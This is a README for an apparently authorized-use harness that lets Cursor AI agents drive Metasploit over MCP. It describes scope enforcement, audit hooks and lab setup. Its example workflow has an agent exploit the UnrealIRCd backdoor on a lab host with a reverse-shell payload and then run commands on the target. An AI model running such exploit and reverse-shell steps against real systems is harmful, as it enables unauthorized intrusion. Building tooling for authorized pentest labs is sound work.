# Metasploit Cursor Harness

[![CI](https://github.com/Suzu-Testing/metasploit-cursor-harness/actions/workflows/test.yml/badge.svg)](https://github.com/Suzu-Testing/metasploit-cursor-harness/actions/workflows/test.yml)
[![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue.svg)](https://www.python.org/)
[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Coverage](https://img.shields.io/badge/coverage-46%25-brightgreen.svg)](https://github.com/Suzu-Testing/metasploit-cursor-harness/actions/workflows/test.yml)

Agentic penetration testing harness that bridges [Cursor](https://cursor.com) AI agents with the [Metasploit Framework](https://github.com/rapid7/metasploit-framework) via MCP (Model Context Protocol). Provides structured, scope-enforced access to Metasploit RPC through 54 purpose-built tools spanning reconnaissance, exploitation, session management, post-exploitation, pivoting, payload generation, and database operations.

Built for authorized lab and professional pentest workflows with explicit rules of engagement, server-side policy enforcement, audit logging, and PTES-aligned phase/gate methodology.

## Why This Harness

| Capability | This Harness | Official msfmcpd | GH05TCREW/MetasploitMCP |
|---|---|---|---|
| Tool count | 54 | ~23 | ~15 |
| Server-side ROE (CIDR, module, session) | Yes | No | No |
| Cursor hooks (scope gates, risk scoring, evidence) | 18 scripts | No | No |
| PTES workflow phases/gates | 7 phases, 57 skills | No | No |
| Console-first exploit execution | Yes | No | Yes |
| asyncio.to_thread (non-blocking) | Yes | Yes | No |
| Domain authorization | Yes (fail-closed) | No | No |
| Auto LHOST detection | Yes (cross-platform) | No | No |
| Check-before-exploit gate | Enforced | No | No |
| Audit logging + world state | Yes | No | No |
| Self-contained pentest skills | 57 skills across 5 tiers | No | No |

## Features

- **54 MCP tools** covering recon, exploitation, sessions, Meterpreter ops, pivoting, payloads, handlers, workspaces, console, database writes, and lab helpers
- **Console-first exploits** with synchronous output capture, session detection, and failure parsing
- **Server-side ROE enforcement**: CIDR scope, domain authorization, CIDR width caps, session limits, DoS blocking, check-before-exploit gate
- **18 Cursor hook scripts**: scope validation, risk scoring (0-100), duplicate detection, evidence logging, world state tracking, credential redaction
- **57 self-contained agent skills**: PTES workflow, domain-specific playbooks (web, AD, cloud, containers, mobile, binary, evasion, service-level, vuln-class)
- **5 specialized subagents**: orchestrator, recon, exploit, post-exploitation, reviewer

## Platform Support

| Platform | Status | Notes |
|----------|--------|-------|
| Windows + WSL2 + Kali | Primary | Full hook pipeline, lab Docker support |
| Native Linux / Kali | Supported | Requires `pwsh` for hooks; native msfrpcd |
| macOS + remote MSF | Experimental | MCP server works; hooks need `pwsh`; point MSF_HOST at remote RPC |

## Prerequisites

- Python 3.10+
- Metasploit Framework (in WSL/Kali or native Linux)
- Cursor IDE with MCP support
- PowerShell Core (`pwsh`) for hook pipeline
- Authorized targets defined in `scope/scope-master.txt`

## Quick Start

### 1. Clone and install

```bash
git clone https://github.com/Suzu-Testing/metasploit-cursor-harness.git
cd metasploit-cursor-harness
python -m venv .venv
# Windows: .venv\Scripts\activate
# Linux/macOS: source .venv/bin/activate
pip install -e ".[mcp]"
```

### 2. Configure credentials

```bash
cp .env.example .env
# Edit .env: set MSF_PASSWORD (must match what you pass to msfrpcd)
```

### 3. Start Metasploit RPC

**Windows (WSL):**
```powershell
.\scripts\start-msfrpcd.ps1
```

**Linux / Kali (native):**
```bash
./scripts/start-msfrpcd.sh
```

### 4. Enable MCP in Cursor

```bash
cp .cursor/mcp.json.example .cursor/mcp.json
# Edit mcp.json: set "cwd" to your absolute project path
```

Toggle **msf-harness** on in Cursor Settings > MCP.

### 5. Verify setup

```bash
python scripts/doctor.py       # Check all prerequisites
python scripts/validate-mcp.py  # Test RPC connectivity
```

Then in Cursor chat, run `msf_status` to confirm the MCP connection.

### 6. Lab targets (optional)

See [docs/LAB.md](docs/LAB.md) for the built-in Metasploitable2 Docker lab.

For HackTheBox, TryHackMe, OSCP, or your own targets, see [docs/BYO-TARGETS.md](docs/BYO-TARGETS.md).

For detailed setup instructions, see [docs/SETUP.md](docs/SETUP.md).

**Or run the one-command bootstrap:**

```powershell
.\scripts\bootstrap.ps1
```

## Your First Exploit

Once setup is complete and `msf_status` works in Cursor chat, try this end-to-end demo against the Docker lab:

**1. Start the lab targets:**

```powershell
.\scripts\start-lab-targets.ps1
```

**2. In Cursor chat, ask the agent to exploit the lab:**

> Scan the lab target at 10.255.255.254 port 9667 and exploit the UnrealIRCd backdoor using engagement lab-default

The agent will:
1. Run `msf_module_check` to verify the target is vulnerable (required by ROE)
2. Call `msf_get_lab_network` to auto-detect LHOST
3. Run `msf_run_exploit` with `exploit/unix/irc/unreal_ircd_3281_backdoor`
4. Call `msf_list_active_sessions` to confirm the shell
5. Use `msf_send_session_command` to run commands on the target

**Or do it step-by-step with individual MCP tool calls:**

```
msf_status                              # Verify RPC connection
msf_get_lab_network                     # Get LHOST and port map
msf_module_check(...)                   # Probe for vulnerability
msf_run_exploit(...)                    # Pop a shell
msf_send_session_command(command="id")  # Run commands on target
```

See [docs/LAB.md](docs/LAB.md) for the full port map and exploit-specific notes.

## Architecture

```
Cursor Agent
  |-- Rules (.cursor/rules/: ROE, MCP routing, workflow orchestration)
  |-- Skills (.cursor/skills/: 57 pentest playbooks)
  |-- Hooks (.cursor/hooks/: 18 safety scripts, scope gates + evidence logging)
  |-- Subagents (.cursor/agents/: orchestrator, recon, exploit, post, reviewer)
  |
  v
msf-harness MCP Server (Python, FastMCP, stdio transport)
  |-- Read tools (23: search, info, hosts, services, vulns, creds, loot, etc.)
  |-- Action tools (31: exploit, aux, post, sessions, handlers, payloads, etc.)
  |-- Policy/ROE (server-side CIDR, domain, module, session validation)
  |-- Console engine (synchronous module execution with output capture)
  |
  v
msfrpcd (WSL/Kali or native Linux, MessagePack RPC, 127.0.0.1:55553)
  |
  v
msfdb (PostgreSQL)
```

## MCP Tools (54 total)

### Read-Only (no engagement_id required)

| Tool | Purpose |
|------|---------|
| `msf_status` | Check RPC connectivity, version, session count |
| `msf_search_modules` | Search modules by keyword, CVE, or name |
| `msf_module_info` | Module options, targets, references, rank |
| `msf_module_options` | Get configurable options for a module |
| `msf_running_stats` | Get statistics on currently running modules |
| `msf_list_modules` | List modules by type with optional filter |
| `msf_host_info` | Query discovered hosts from msfdb |
| `msf_service_info` | Query discovered services (ports, protocols) |
| `msf_vulnerability_info` | Query vulnerability records |
| `msf_note_info` | Query annotations/notes |
| `msf_credential_info` | Query harvested credentials |
| `msf_loot_info` | Query collected loot/files |
| `msf_list_active_sessions` | List current sessions with type and target |
| `msf_session_info` | Get detailed info for a single session |
| `msf_list_listeners` | List active handlers/background jobs |
| `msf_job_info` | Get details for a specific job |
| `msf_list_payloads` | Search available payloads by name/platform/arch |
| `msf_compatible_payloads` | List payloads compatible with a given module |
| `msf_list_workspaces` | List database workspaces |
| `msf_db_status` | Check database connectivity and driver info |
| `msf_console_list` | List active RPC console instances |
| `msf_get_lab_network` | Get lab target config (Docker ports, LHOST) |
| `msf_route_list` | List active routes for session pivoting |

### Action (require engagement_id)

| Tool | Purpose |
|------|---------|
| `msf_module_check` | Safe vulnerability probe (non-exploitative) |
| `msf_module_results` | Query results of an async module job by UUID |
| `msf_run_exploit` | Execute exploit module (console or RPC job mode, configurable timeout) |
| `msf_run_auxiliary_module` | Run auxiliary module (scanner, fuzzer; optional console mode) |
| `msf_run_post_module` | Run post-exploitation module on a session (optional console mode) |
| `msf_send_session_command` | Execute command in active shell/meterpreter |
| `msf_terminate_session` | Kill a session |
| `msf_wait_for_session` | Poll for new sessions after exploit/handler |
| `msf_session_upgrade` | Upgrade shell to Meterpreter |
| `msf_session_sysinfo` | Get OS/arch/hostname from Meterpreter session |
| `msf_session_getuid` | Get current user identity from Meterpreter session |
| `msf_session_ps` | List running processes in Meterpreter session |
| `msf_session_download` | Download file from target to evidence/ |
| `msf_session_upload` | Upload file from evidence/ to target (sandboxed) |
| `msf_session_run_script` | Run Meterpreter script in session |
| `msf_start_listener` | Start multi/handler listener |
| `msf_stop_job` | Stop a background job |
| `msf_cleanup_jobs` | Stop all background jobs to free ports |
| `msf_generate_payload` | Generate payload file (saved to evidence/) |
| `msf_create_workspace` | Create database workspace |
| `msf_set_workspace` | Switch active workspace |
| `msf_delete_workspace` | Delete a database workspace |
| `msf_db_import` | Import scan data (nmap XML, Nessus, etc.) |
| `msf_db_nmap` | Run nmap and auto-import results |
| `msf_console_execute` | Run arbitrary msfconsole command via RPC |
| `msf_route_add` | Add route through session for pivoting |
| `msf_route_delete` | Remove a route |
| `msf_autoroute` | Auto-add routes via post/multi/manage/autoroute |
| `msf_report_host` | Manually report host to database |
| `msf_credential_add` | Store discovered credential in database |
| `msf_db_add_note` | Add note/annotation to database |

## Example Workflow

```python
# 1. Verify connection
msf_status()

# 2. Scan target ports
msf_run_auxiliary_module(
  engagement_id="lab-default",
  module_name="auxiliary/scanner/portscan/tcp",
  options={"RHOSTS": "10.255.255.254", "PORTS": "9021,9667,9080"}
)

# 3. Check what's open
msf_service_info(host="10.255.255.254")

# 4. Check before exploit (required by ROE)
msf_module_check(
  engagement_id="lab-default",
  module_type="exploit",
  module_name="unix/irc/unreal_ircd_3281_backdoor",
  options={"RHOSTS": "10.255.255.254", "RPORT": 9667}
)

# 5. Exploit with auto-detected LHOST
lab = msf_get_lab_network()
msf_run_exploit(
  engagement_id="lab-default",
  module_name="unix/irc/unreal_ircd_3281_backdoor",
  options={"RHOSTS": "10.255.255.254", "RPORT": 9667},
  payload="generic/shell_reverse_tcp",
  payload_options={"LHOST": lab["data"]["lhost"], "LPORT": 4449},
  run_check_first=True
)
```

## Safety Model

1. **Server-side ROE** (`msf_harness/mcp/policy/roe.py`): validates targets against engagement CIDRs, blocks forbidden modules, enforces session limits, caps CIDR scan width, requires check-before-exploit, validates domains (fail-closed)
2. **Cursor hooks** (`.cursor/hooks/`): scope gates on every shell command and MCP call, risk scoring (0-100 with CRITICAL escalation), duplicate detection, audit logging to `logs/command-ledger.jsonl`, evidence auto-save, credential redaction
3. **Console command parsing**: `msf_console_execute` extracts and validates RHOSTS, module paths, and db_nmap targets from raw commands
4. **File path restrictions**: `msf_db_import` and `msf_generate_payload` restricted to `evidence/` and `engagements/` directories
5. **DoS modules** (`auxiliary/dos/*`) blocked unconditionally
6. **Input sanitization**: nmap args allowlisted, option keys validated, console values quote-escaped

**Use only on systems you are authorized to test.**

## Troubleshooting

| Symptom | Fix |
|---------|-----|
| `msf_status` says "Cannot connect to msfrpcd" | Run `.\scripts\start-msfrpcd.ps1`; verify msfrpcd is listening with `wsl -e bash -lc "ss -tlnp \| grep 55553"` |
| MCP server not appearing in Cursor | Ensure `.cursor/mcp.json` uses **absolute paths** for `cwd` and `PYTHONPATH`; restart Cursor |
| "MSF_PASSWORD is not set" | Set it in `.env` (copy from `.env.example` if needed) |
| "Target not in scope" or ROE denial | Add the target IP/CIDR to `scope/scope-master.txt` AND `engagements/<id>/roe.yaml` `authorized_cidrs` |
| Module check fails with "not supported" | Some modules lack a `check` method; this is normal. Proceed with caution. |
| No session after exploit | Verify LHOST is correct (`msf_get_lab_network`); check firewall; try a different payload |
| Hook errors in Cursor output | Verify `pwsh` (PowerShell 7+) is installed: `winget install Microsoft.PowerShell` |
| Python import errors | Run `pip install -e ".[mcp]"` from the project root |

Run `python scripts/doctor.py` for a full prerequisite health check.

## Development

```bash
pip install -e ".[mcp,dev]"
python -m pytest tests/ -v                                    # 269 Python tests
pwsh -ExecutionPolicy Bypass -File scripts/test-hooks.ps1     # 120 hook tests
python scripts/validate-mcp.py                                # RPC connectivity
```

See [CONTRIBUTING.md](CONTRIBUTING.md) for development setup and PR guidelines.

## Directory Structure

| Path | Purpose |
|------|---------|
| `msf_harness/mcp/` | Python MCP server package |
| `msf_harness/mcp/tools/` | MCP tool implementations (12 modules, 54 tools) |
| `msf_harness/mcp/rpc/` | Metasploit RPC client with auto-reconnect |
| `msf_harness/mcp/policy/` | ROE enforcement (CIDR, domain, module, session, exploit-gate) |
| `scope/` | Authorized target CIDRs and domains |
| `engagements/` | Per-engagement ROE configs and workflow state |
| `evidence/msf/` | Captured evidence (gitignored) |
| `logs/` | Hook audit logs and command ledger (gitignored) |
| `.cursor/hooks/` | PowerShell Core safety gates (18 scripts) |
| `.cursor/skills/` | Agent workflow playbooks (57 skills) |
| `.cursor/agents/` | Custom subagent definitions (5 agents) |
| `.cursor/rules/` | Always-on agent guidance (3 rules + AGENTS.md) |
| `scripts/` | Utility scripts (start RPC, create engagement, health check, validate MCP) |
| `tests/` | Pytest + hook test suites |
| `docs/` | Setup guide, lab guide, BYO targets guide |

## License

[MIT](LICENSE)

## Acknowledgments

- [Rapid7 Metasploit Framework](https://github.com/rapid7/metasploit-framework) and official `msfmcpd`
- [GH05TCREW/MetasploitMCP](https://github.com/GH05TCREW/MetasploitMCP) for console execution patterns
- [pymetasploit3](https://github.com/DanMcInerney/pymetasploit3)
